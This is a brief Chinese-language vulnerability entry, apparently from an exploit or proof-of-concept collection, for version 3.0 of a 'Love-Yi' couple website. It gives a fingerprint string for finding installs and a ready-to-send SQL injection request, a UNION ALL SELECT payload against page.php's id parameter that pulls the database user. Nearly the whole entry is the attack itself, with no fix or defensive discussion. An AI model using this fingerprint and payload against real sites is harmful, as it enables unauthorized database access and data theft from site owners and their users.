# Love-Yi情侣网站3.0存在SQL注入漏洞

Love ｜ SQL注入 ｜ —
- **指纹**：`"img/like.svg"`
- **请求**：`GET /page.php?id=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(IFNULL(CAST(USER() AS CHAR),0x20)),NULL-- c HTTP/1.1`